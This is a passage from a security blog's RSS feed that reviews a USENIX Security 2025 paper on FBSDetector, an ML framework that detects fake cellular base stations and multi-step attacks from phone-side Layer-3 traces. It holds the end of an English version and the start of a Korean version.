performed fairly rigorous app validation in a controlled lab environment.</p><p><img src="/2025/12/21/clalxk/fbs_paper_review_en/figure8_lab_setup.png" alt="Figure 8: Controlled lab environment setup"></p><p>Figure 8: Controlled lab environment setup</p><p><em>Figure 8: Controlled experiments with USRP B210, a laptop (core), and a smartphone (app)</em></p><p>The experimental scenarios include a lab 4G network with their own SIM, commercial SIMs (e.g., Google Fi), distance changes, and limited mobility. In the 24-hour stress test, they executed 21 attacks 5 times each, for a total of 105 attacks. In the long-term test, they ran the app for 7 days under various usage patterns and observed environments where packets accumulate.</p><p>They also ran comparative experiments against existing app-based detection solutions (AIMSICD, SnoopSnitch). In the same controlled environment, those two solutions did not detect the FBS, but FBSDetector did (as described in the paper).</p><hr><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>In one sentence, FBSDetector can be seen as a &#x201C;UE-side detection framework&#x201D; with the following direction.</p><ul><li><strong>Using only Layer-3 (NAS/RRC) traces</strong></li><li><strong>On the UE (device)</strong></li><li>Performing <strong>FBS detection + MSA recognition</strong></li><li>As a practical framework with relatively low overhead</li></ul><p>In other words, FBSDetector is an ML-based FBS/MSA detection system that uses Layer-3 network traces. It builds large-scale realistic datasets (FBSAD, MSAD) and achieves high detection accuracy with low overhead by using advanced ML models such as Stateful LSTM with Attention and Graph Learning. The paper states that future work will port FBSDetector to 5G networks, support detection of overshadow attacks, and focus on integrating FBS detection and attack defense mechanisms in ORAN environments. I&#x2019;m looking forward to seeing how it expands both the porting process to 5G and the detectable scope.</p><hr><h1 id="Closing-thoughts"><a href="#Closing-thoughts" class="headerlink" title="Closing thoughts"></a>Closing thoughts</h1><p>Personally, beyond FBS detection itself, I found the attempt to <strong>model MSA as graphs and learn them as patterns</strong> especially interesting.</p><p>Of course, the limitations are also clear.</p><ul><li>Rooting/permissions/device constraints (especially on iOS) remain major barriers to deployment.</li><li>Attacks that &#x201C;look identical to normal behavior&#x201D; from the UE&#x2019;s perspective are inherently difficult (FP/FN).</li><li>Expanding to 5G/other environments brings back the experimental infrastructure and dataset problems.</li></ul><p>One particularly impressive part (in the translated version) was how realistically the paper discusses &#x201C;what FP/FN mean.&#x201D; Since FBS itself is not a frequent event, even a small FP rate can significantly degrade usability in real deployment. With that in mind, the paper leaves room to interpret that at the current stage, it may be especially useful in security-first environments or for sensitive user groups rather than the general public.</p><p>Still, it was a very interesting read. If I find another interesting paper on cellular networks, I&#x2019;ll be back with another review~~</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/FBS/">FBS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Paper/">Paper</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/21/clalxk/fbs_paper_review_en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] “Gotta Detect &#39;Em All: Fake Base Station and Multi-Step Attack Detection in Cellular Networks” Paper Review (KR)</title>
      <link>https://hackyboiz.github.io/2025/12/21/clalxk/fbs_paper_review_kr/</link>
      <guid>https://hackyboiz.github.io/2025/12/21/clalxk/fbs_paper_review_kr/</guid>
      <pubDate>Sun, 21 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! clalxk &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&amp;#xBC14;&amp;#xC05C; &amp;#xC5F0;&amp;#xB9D0;&amp;#xC744; &amp;#xBCF4;&amp;#xB</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! clalxk &#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xBC14;&#xC05C; &#xC5F0;&#xB9D0;&#xC744; &#xBCF4;&#xB0B4;&#xACE0;(2&#xAC1C;&#xC758; &#xD559;&#xAD50;&#x2026;)&#xC788;&#xC5B4;&#xC11C; &#xB17C;&#xBB38; &#xB9AC;&#xBDF0; &#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.. &#xD558;&#xD558;.. </p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xC140;&#xB8F0;&#xB7EC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0;&#xC11C; &#xC5EC;&#xC804;&#xD788; &#xD604;&#xC2E4;&#xC801;&#xC778; &#xC704;&#xD611;&#xC73C;&#xB85C; &#xB0A8;&#xC544;&#xC788;&#xB294; <strong>&#xAC00;&#xC9DC; &#xAE30;&#xC9C0;&#xAD6D;(Fake Base Station, FBS)</strong> &#xACFC;, &#xC774;&#xB97C; &#xBC1C;&#xD310;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xB418;&#xB294; <strong>Multi-Step Attack, MSA</strong>&#xC744; <strong>&#xB2E8;&#xB9D0;(UE) &#xCE21;&#xC5D0;&#xC11C;</strong> &#xD0D0;&#xC9C0;&#xD558;&#xB294; &#xB17C;&#xBB38;&#xC744; &#xB9AC;&#xBDF0;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xB17C;&#xBB38;&#xC740; Usenix Security 2025A&#xC5D0;&#xC11C; &#xBC1C;&#xD45C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.(<a href="https://www.usenix.org/system/files/usenixsecurity25-mubasshir.pdf">&#xB9C1;&#xD06C;</a>)</p><p>&#xB17C;&#xBB38;&#xC740; <strong>FBSDetector</strong> &#xB77C;&#xB294; ML &#xAE30;&#xBC18; &#xD0D0;&#xC9C0; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xC81C;&#xC548;&#xD558;&#xACE0;, FBS&#xC640; multi-step attack(MSA)&#xC758; &#xC2EC;&#xAC01;&#xD55C; &#xBCF4;&#xC548; &#xC704;&#xD611;&#xC5D0; &#xB300;&#xC751;&#xD558;&#xAE30; &#xC704;&#xD574; UE(User Equipment)&#xC5D0;&#xC11C; Layer-3 network traces&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xB294; ML &#xAE30;&#xBC18; &#xD0D0;&#xC9C0; &#xC194;&#xB8E8;&#xC158;&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xC11C;&#xC220;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC194;&#xB8E8;&#xC158;&#xC740; POWDER&#xB97C; &#xD1B5;&#xD574; &#xC2E4;&#xC81C; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xBC18;&#xC601;&#xD558;&#xC5EC; &#xAD6C;&#xCD95;&#xB41C; &#xCD5C;&#xCD08;&#xC758; &#xB300;&#xADDC;&#xBAA8; &#xACE0;&#xD488;&#xC9C8; FBSAD &#xBC0F; MSAD datasets&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; FBS &#xD0D0;&#xC9C0;&#xB97C; &#xC704;&#xD55C; stateful LSTM with attention&#xACFC; MSA &#xC778;&#xC2DD;&#xC744; &#xC704;&#xD55C; graph learning&#xC744; &#xD1B5;&#xD569;&#xD569;&#xB2C8;&#xB2E4;. FBSDetector&#xB294; FBS&#xC5D0; &#xB300;&#xD574; 96%&#xC758; &#xC815;&#xD655;&#xB3C4;&#xC640; 2.96%&#xC758; &#xB0AE;&#xC740; false positive rate, MSA&#xC5D0; &#xB300;&#xD574; 86%&#xC758; &#xC815;&#xD655;&#xB3C4;&#xC640; 3.28%&#xC758; false positive rate&#xB97C; &#xB2EC;&#xC131;&#xD558;&#xBA70;, &#xBAA8;&#xBC14;&#xC77C; &#xC571;&#xC73C;&#xB85C; &#xBC30;&#xD3EC;&#xB418;&#xC5B4; &#xB0AE;&#xC740; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xB85C; &#xC2E4;&#xC81C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xAC80;&#xC99D;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>&#xC140;&#xB8F0;&#xB7EC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xACF5;&#xACA9; &#xC911;&#xC5D0;&#xC11C; FBS(&#xBD88;&#xBC95;/rogue &#xAE30;&#xC9C0;&#xAD6D;)&#xAC00; &#xBB34;&#xC11C;&#xC6B4; &#xC774;&#xC720;&#xB294; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. <strong>&#xC815;&#xC0C1; &#xAE30;&#xC9C0;&#xAD6D;&#xC778; &#xCC99;(&#xC0AC;&#xCE6D;)</strong> &#xD574;&#xC11C; UE&#xB97C; &#xB04C;&#xC5B4;&#xC624;&#xACE0;, &#xADF8; &#xC774;&#xD6C4;&#xC5D0; &#xB2E4;&#xC591;&#xD55C; &#xACF5;&#xACA9;(DoS, &#xB2E4;&#xC6B4;&#xADF8;&#xB808;&#xC774;&#xB4DC;, &#xC704;&#xCE58;&#xCD94;&#xC801; &#xB4F1;)&#xC744; &#x201C;&#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xC808;&#xCC28;&#x201D;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xAC8C; &#xC11E;&#xC5B4;&#xBC84;&#xB9B4; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p>FBS&#xAC00; &#xC81C;&#xAE30;&#xD558;&#xB294; &#xC704;&#xD611;&#xC740; &#xC0C8;&#xB85C;&#xC6B4; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xBA70; &#xC624;&#xB7AB;&#xB3D9;&#xC548; &#xC874;&#xC7AC;&#xD574; &#xC654;&#xC9C0;&#xB9CC;, &#xC804; &#xC138;&#xACC4; &#xACF5;&#xACA9;&#xC790;&#xB4E4;&#xC5D0; &#xC758;&#xD574; &#xC5EC;&#xC804;&#xD788; &#xAD11;&#xBC94;&#xC704;&#xD558;&#xAC8C; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xD45C;&#xC900;/&#xC0AC;&#xC591; &#xB808;&#xBCA8; &#xBC29;&#xC5B4;&#xB294; &#xB290;&#xB9BC;</strong>: &#xC0C8;&#xB85C;&#xC6B4; &#xBC29;&#xC5B4;&#xAC00; &#xD45C;&#xC900;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xACE0;, &#xCE69;&#xC14B;/&#xB2E8;&#xB9D0;/&#xB9DD;&#xC5D0; &#xC804;&#xD30C;&#xB418;&#xAE30;&#xAE4C;&#xC9C0; &#xC2DC;&#xAC04;&#xC774; &#xC624;&#xB798; &#xAC78;&#xB9BD;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC804; &#xC138;&#xACC4;&#xC5D0; &#xC774;&#xBBF8; &#xCDE8;&#xC57D;&#xD55C; &#xB2E8;&#xB9D0;&#xC774; &#xB108;&#xBB34; &#xB9CE;&#xC74C;</strong>: &#xAD50;&#xCCB4; &#xBE44;&#xC6A9;&#xB3C4; &#xD604;&#xC2E4;&#xC801;&#xC73C;&#xB85C; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xC8E0;.</li><li><strong>&#xAE30;&#xC874; &#xD0D0;&#xC9C0;&#xC758; &#xD55C;&#xACC4;</strong><ul><li>&#xD734;&#xB9AC;&#xC2A4;&#xD2F1;/&#xC2DC;&#xADF8;&#xB2C8;&#xCC98; &#xAE30;&#xBC18;&#xC740; &#xC801;&#xC751;&#xD615; &#xACF5;&#xACA9;&#xC790;(&#xD544;&#xB4DC; &#xC0B4;&#xC9DD; &#xBC14;&#xAFB8;&#xAC70;&#xB098; &#xC21C;&#xC11C; &#xBC14;&#xAFB8;&#xB294;&#x2026;?)&#xC5D0;&#xAC8C; &#xC57D;&#xD568;</li><li>&#xD06C;&#xB77C;&#xC6B0;&#xB4DC;&#xC18C;&#xC2F1;/&#xC678;&#xBD80; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC758;&#xC874;&#xC740; &#xB300;&#xADDC;&#xBAA8; &#xBC30;&#xD3EC;&#xAC00; &#xC5B4;&#xB835;&#xAC70;&#xB098; &#xBE44;&#xC6A9;&#xC774; &#xD07C;</li><li>&#xD558;&#xC704; &#xACC4;&#xCE35;(&#xBB3C;&#xB9AC;/&#xBB34;&#xC120;)&#xB9CC; &#xBCF4;&#xB294; &#xBC29;&#xC2DD;&#xC740; &#xC815;&#xAD50;&#xD55C; FBS &#xBC0F; MSA&#xAE4C;&#xC9C0; &#xCEE4;&#xBC84;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6C0;</li></ul></li></ul><p>&#xB17C;&#xBB38;&#xC740; &#xC5EC;&#xAE30;&#xC11C; &#xD55C; &#xBC1C; &#xB354; &#xB4E4;&#xC5B4;&#xAC00;&#xC11C;, &#x201C;5G&#xB77C;&#xC11C; &#xC548;&#xC804;&#xD574;&#xC84C;&#xB2E4;&#x201D;&#xB85C; &#xC815;&#xB9AC;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB2E4;&#xB294; &#xC810;&#xB3C4; &#xAC15;&#xC870;&#xD569;&#xB2C8;&#xB2E4;. 4G&#xC5D0;&#xC11C;&#xB294; IMSI&#xAC00; &#xC554;&#xD638;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD615;&#xD0DC;&#xB85C; &#xC4F0;&#xC600;&#xC9C0;&#xB9CC;, 5G&#xC5D0;&#xC11C;&#xB3C4; FBS&#xAC00; &#xACF5;&#xACA9;&#xC5D0; &#xD65C;&#xC6A9;&#xB420; &#xC5EC;&#xC9C0;&#xAC00; &#xC788;&#xACE0;, &#xCD5C;&#xADFC; &#xC81C;&#xC548;&#xB418;&#xB294; &#xC778;&#xC99D;&#xC11C;/&#xC11C;&#xBA85; &#xAE30;&#xBC18; &#xBC29;&#xC5B4;&#xB294; <strong>&#xC624;&#xBC84;&#xD5E4;&#xB4DC;</strong>&#xC640; <strong>&#xC0AC;&#xC591; &#xBCC0;&#xACBD;</strong>&#xBFD0; &#xC544;&#xB2C8;&#xB77C; <strong>&#xB85C;&#xBC0D; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xC758; &#xD0A4; &#xACF5;&#xC720; &#xBB38;&#xC81C;</strong>&#xAE4C;&#xC9C0; &#xB3D9;&#xBC18;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; Google/Apple&#xC774; FBS&#xB97C; &#xBB34;&#xB825;&#xD654;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC0C8;&#xB85C;&#xC6B4; &#xC811;&#xADFC;&#xC744; &#xCC44;&#xD0DD;&#xD588;&#xC9C0;&#xB9CC;, &#xADF8; &#xBC94;&#xC704; &#xBC16;&#xC5D0;&#xC11C;&#xB294; &#xC5EC;&#xC804;&#xD788; &#xC9C0;&#xC2DD;&#xC774; &#xD48D;&#xBD80;&#xD558;&#xACE0; &#xC7A5;&#xBE44;&#xB97C; &#xAC16;&#xCD98; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD65C;&#xB3D9;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#x201C;&#xD0D0;&#xC9C0;&#x201D; &#xC790;&#xCCB4;&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;&#xB294; &#xB17C;&#xC9C0;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB798;&#xC11C; &#xC774; &#xB17C;&#xBB38;&#xC740; &#x201C;&#xADF8;&#xB7FC; UE&#xAC00; &#xC774;&#xBBF8; &#xBCF4;&#xACE0; &#xC788;&#xB294; <strong>Layer-3 &#xD2B8;&#xB808;&#xC774;&#xC2A4;(NAS/RRC)</strong> &#xB9CC;&#xC73C;&#xB85C;, &#xB2E8;&#xB9D0;&#xC5D0;&#xC11C; &#xC800;&#xBE44;&#xC6A9;&#xC73C;&#xB85C; &#xC7A1;&#xC544;&#xBCF4;&#xC790;&#x201D;&#xB294; &#xCABD;&#xC73C;&#xB85C; &#xAC11;&#xB2C8;&#xB2E4;.</p><blockquote><p>NAS: UE &#x2194;&#xFE0E; &#xCF54;&#xC5B4;(EPC) &#xAC04; &#xC81C;&#xC5B4;&#xD3C9;&#xBA74; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;RRC: UE &#x2194;&#xFE0E; &#xAE30;&#xC9C0;&#xAD6D;(eNodeB) &#xAC04; &#xC81C;&#xC5B4;&#xD3C9;&#xBA74; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;MSA: FBS&#xB97C; &#xBC1C;&#xD310;&#xC73C;&#xB85C; &#xC5EC;&#xB7EC; &#xC808;&#xCC28;/&#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC5EE;&#xC5B4;&#xC11C; &#xCD5C;&#xC885; &#xBAA9;&#xC801;(DoS/&#xCD94;&#xC801;/&#xB2E4;&#xC6B4;&#xADF8;&#xB808;&#xC774;&#xB4DC; &#xB4F1;)&#xC744; &#xB2EC;&#xC131;&#xD558;&#xB294; &#xACF5;&#xACA9;</p></blockquote><hr><h1 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h1><h2 id="0-System-Overview"><a href="#0-System-Overview" class="headerlink" title="0. System Overview"></a>0. System Overview</h2><p>&#xC804;&#xCCB4; &#xD750;&#xB984;&#xC740; &#x201C;(1) &#xB370;&#xC774;&#xD130;&#xC14B; &#xB9CC;&#xB4E4;&#xAE30; &#x2192; (2) 2&#xB2E8;&#xACC4; FBS &#xD0D0;&#xC9C0; &#x2192; (3) &#xADF8;&#xB798;&#xD504; &#xAE30;&#xBC18; MSA &#xC778;&#xC2DD; &#x2192; (4) NAS/RRC &#xC608;&#xCE21; &#xACB0;&#xD569; &#x2192; (5) &#xC571; &#xBC30;&#xD3EC;&#x201D;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/12/21/clalxk/fbs_paper_review_kr/figure2_fbsdetector_architecture.png" alt="Figure 2: FBSDetector &#xC804;&#xCCB4; &#xC544;&#xD0A4;&#xD14D;&#xCC98;"></p><p>Figure 2: FBSDetector &#xC804;&#xCCB4; &#xC544;&#xD0A4;&#xD14D;&#xCC98;</p><p><em>&#xADF8;&#xB9BC; 2: &#xB370;&#xC774;&#xD130;&#xC14B; &#xAD6C;&#xCD95;/ML &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;/&#xBC30;&#xD3EC;&#xAE4C;&#xC9C0; &#xD3EC;&#xD568;&#xD55C; FBSDetector &#xAC1C;&#xC694;</em></p><hr><h2 id="1-Threat-Model-amp-Scope"><a href="#1-Threat-Model-amp-Scope" class="headerlink" title="1. Threat Model &amp; Scope"></a>1. Threat Model &amp; Scope</h2><p>&#xB17C;&#xBB38;&#xC5D0;&#xC11C; &#xAC00;&#xC815;&#xD558;&#xB294; &#xACF5;&#xACA9;&#xC790; &#xBAA8;&#xB378;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC815;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xD569;&#xBC95; BS&#xB97C; &#xC0AC;&#xCE6D;&#xD574;&#xC11C; <strong>&#xB354; &#xAC15;&#xD55C; &#xC2E0;&#xD638;&#xB85C; UE&#xC758; &#xC7AC;&#xC120;&#xD0DD;&#xC744; &#xC720;&#xB3C4;</strong></li><li>&#xACF5;&#xAC1C; &#xCC44;&#xB110; &#xB3C4;&#xCCAD;&#xC73C;&#xB85C; &#xD569;&#xBC95; &#xAC12;&#xB4E4;&#xC744; <strong>&#xD559;&#xC2B5;/&#xBAA8;&#xBC29;</strong> &#xAC00;&#xB2A5;</li><li>&#xC554;&#xD638; &#xC790;&#xCCB4;&#xB97C; &#xAE68;&#xAC70;&#xB098; SIM/&#xCF54;&#xC5B4;/BS &#xC7A5;&#xBE44;&#xB97C; &#xBB3C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xC870;&#xD558;&#xB294; &#xAE09;&#xC740; &#xC544;&#xB2D8;</li><li>&#xB300;&#xC2E0; &#xD0D0;&#xC9C0;&#xB97C; &#xD53C;&#xD558;&#xB824;&#xACE0; <strong>&#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xBE60;&#xB974;&#xAC8C; &#xBC14;&#xAFB8;&#xAC70;&#xB098;</strong>, <strong>&#xC804;&#xC1A1;&#xC804;&#xB825; &#xC870;&#xC815;</strong>, <strong>&#xB09C;&#xB3C5;&#xD654;</strong> &#xAC19;&#xC740; &#xAC74; &#xAC00;&#xB2A5;</li></ul><p>&#xBC30;&#xD3EC; &#xBC94;&#xC704;&#xB294; <strong>4G(LTE) &#xC911;&#xC2EC;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xC720;&#xB294; (1) &#xD604;&#xC2E4;&#xC5D0;&#xC11C; 4G&#xAC00; &#xC544;&#xC9C1; &#xB113;&#xAC8C; &#xAE54;&#xB824; &#xC788;&#xACE0;, (2) &#xB370;&#xC774;&#xD130;&#xC14B;&#xC744; &#xB9CC;&#xB4E4;&#xAE30; &#xC704;&#xD55C; &#xC2E4;&#xD5D8; &#xC778;&#xD504;&#xB77C;(POWDER)&#xAC00; 4G &#xC2E4;&#xD5D8;&#xC744; &#xC798; &#xC9C0;&#xC6D0;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB17C;&#xBB38;&#xC774; &#xC815;&#xB9AC;&#xD55C; &#x201C;&#xC124;&#xACC4; &#xACFC;&#xC81C;&#x201D;&#xB97C; &#xC694;&#xC57D;&#xD558;&#xBA74; &#xB2E4;&#xC74C; &#xB2E4;&#xC12F; &#xAC00;&#xC9C0;&#xB85C; &#xC815;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xB370;&#xC774;&#xD130;&#xC14B; &#xAC00;&#xC6A9;&#xC131;/&#xD488;&#xC9C8;(C1)</strong>: &#xD569;&#xBC95; BS/FBS/MSA&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xC2E4;&#xC81C; &#xC218;&#xC900; &#xB370;&#xC774;&#xD130; &#xD655;&#xBCF4;&#xAC00; &#xC5B4;&#xB835;&#xB2E4;</li><li><strong>&#xD328;&#xD0B7; &#xD2B8;&#xB808;&#xC774;&#xC2A4;&#xC5D0;&#xC11C;&#xC758; FBS &#xD0D0;&#xC9C0;(C2)</strong>: &#xB3D9;&#xC77C;&#xD55C; &#xBA54;&#xC2DC;&#xC9C0;&#xB3C4; &#xB9E5;&#xB77D;&#xC5D0; &#xB530;&#xB77C; &#xC815;&#xC0C1;/&#xC545;&#xC131;&#xC77C; &#xC218; &#xC788;&#xB2E4;</li><li><strong>MSA &#xC778;&#xC2DD;(C3)</strong>: &#xB2E4;&#xB2E8;&#xACC4; &#xD328;&#xD134;&#xC740; &#xBCF5;&#xC7A1;&#xD558;&#xACE0; &#xC9C4;&#xD654;&#xD55C;&#xB2E4;</li><li><strong>NAS/RRC &#xC608;&#xCE21; &#xACB0;&#xD569;(C4)</strong>: &#xACC4;&#xCE35;&#xBCC4; &#xBAA8;&#xB378;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xD558;&#xB098;&#xC758; &#xD310;&#xB2E8;&#xC73C;&#xB85C; &#xBB36;&#xC744; &#xAC83;&#xC778;&#xAC00;</li><li><strong>&#xC2E4;&#xC2DC;&#xAC04; &#xD0D0;&#xC9C0;(C5)</strong>: &#xC628;&#xB514;&#xBC14;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xBE60;&#xB974;&#xAC8C; &#xCEA1;&#xCC98;/&#xCC98;&#xB9AC;/&#xCD94;&#xB860;&#xAE4C;&#xC9C0; &#xAC00;&#xB2A5;&#xD574;&#xC57C; &#xD55C;&#xB2E4;</li></ul><hr><h2 id="2-TAU-Reject-FBS-&#xAE30;&#xBC18;-MSA"><a href="#2-TAU-Reject-FBS-&#xAE30;&#xBC18;-MSA" class="headerlink" title="2. TAU Reject (FBS &#xAE30;&#xBC18; MSA)"></a>2. TAU Reject (FBS &#xAE30;&#xBC18; MSA)</h2><p>&#xB17C;&#xBB38;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xB294; &#xB300;&#xD45C; &#xACF5;&#xACA9; &#xC911; &#xD558;&#xB098;&#xAC00; <strong>TAU Reject</strong> &#xC785;&#xB2C8;&#xB2E4;. &#x201C;&#xC808;&#xCC28; &#xBA54;&#xC2DC;&#xC9C0;&#x201D;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xC9C0;&#xB9CC;, &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; UE&#xB97C; <strong>&#xC11C;&#xBE44;&#xC2A4; &#xBD88;&#xAC00;</strong> &#xC0C1;&#xD0DC;&#xB85C; &#xBAB0;&#xACE0; &#xAC00;&#xAC70;&#xB098; &#xB2E4;&#xC6B4;&#xADF8;&#xB808;&#xC774;&#xB4DC; &#xB4F1;&#xC744; &#xC720;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD575;&#xC2EC;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>FBS&#xAC00; <strong>&#xAC15;&#xD55C; &#xC2E0;&#xD638;</strong>&#xC640; <strong>&#xC7AC;&#xC120;&#xD0DD; &#xC6B0;&#xC120;&#xC21C;&#xC704;</strong>&#xB97C; &#xC774;&#xC6A9;&#xD574; UE&#xB97C; &#xB04C;&#xC5B4;&#xC635;&#xB2C8;&#xB2E4;.</li><li>UE&#xAC00; &#xC0C8; TA&#xB97C; &#xAC10;&#xC9C0;&#xD55C; &#xAC83;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xAC8C; &#xD558;&#xB824;&#xBA74; FBS&#xAC00; <strong>&#xB2E4;&#xB978; TAC</strong>&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</li><li>UE&#xAC00; TAU&#xB97C; &#xC694;&#xCCAD;&#xD558;&#xBA74;, FBS&#xAC00; <strong>TrackingAreaUpdateReject</strong>&#xB97C; &#xBCF4;&#xB0B4;&#xC11C; &#xBAA9;&#xC801;&#xC744; &#xB2EC;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p><img src="/2025/12/21/clalxk/fbs_paper_review_kr/figure1_tau_reject_attack.png" alt="Figure 1: TAU Reject &#xACF5;&#xACA9; &#xD50C;&#xB85C;&#xC6B0;"></p><p>Figure 1: TAU Reject &#xACF5;&#xACA9; &#xD50C;&#xB85C;&#xC6B0;</p><p><em>&#xADF8;&#xB9BC; 1: TAU Reject &#xACF5;&#xACA9; &#xD750;&#xB984; (UE&#xB97C; FBS&#xB85C; &#xC720;&#xC778; &#x2192; TAU &#xC808;&#xCC28;&#xC5D0;&#xC11C; Reject &#xC8FC;&#xC785; &#x2192; &#xC5F0;&#xACB0;/&#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC601;&#xD5A5;)</em></p><hr><h2 id="3-Dataset-FBSAD-MSAD-POWDER-&#xAE30;&#xBC18;"><a href="#3-Dataset-FBSAD-MSAD-POWDER-&#xAE30;&#xBC18;" class="headerlink" title="3. Dataset: FBSAD / MSAD (POWDER &#xAE30;&#xBC18;)"></a>3. Dataset: FBSAD / MSAD (POWDER &#xAE30;&#xBC18;)</h2><p>&#xC774; &#xB17C;&#xBB38;&#xC758; &#xAC15;&#xC810; &#xC911; &#xD558;&#xB098;&#xB294; <strong>&#xB370;&#xC774;&#xD130;&#xC14B;&#xC744; &#xC2E4;&#xC81C; &#xD658;&#xACBD;&#xC5D0; &#xAC00;&#xAE5D;&#xAC8C; &#xAD6C;&#xC131;</strong>&#xD588;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xACF5;&#xACF5;&#xC7A5;&#xC18C;&#xC5D0;&#xC11C; FBS &#xC2E4;&#xD5D8;&#xC740; &#xBD88;&#xBC95;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xB17C;&#xBB38;&#xC740; POWDER &#xD14C;&#xC2A4;&#xD2B8;&#xBCA0;&#xB4DC;&#xC5D0;&#xC11C; <strong>&#xC2E4;&#xC81C; OTA &#xD328;&#xD0B7;</strong> &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB370;&#xC774;&#xD130;&#xC14B;&#xC744; &#xAD6C;&#xCD95;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>FBSAD</strong>: FBS &#xD0D0;&#xC9C0;&#xC6A9;</li><li><strong>MSAD</strong>: 21&#xAC1C; MSA &#xC778;&#xC2DD;&#xC6A9;</li><li>&#xCD1D; 9.2GB(&#xC6D0;&#xBCF8; &#xAE30;&#xC900;), &#xC774;&#xB3D9;&#xC131;/&#xACF5;&#xACA9;&#xC790; &#xB2A5;&#xB825; &#xB808;&#xBCA8;(0~4) &#xB4F1;&#xC744; 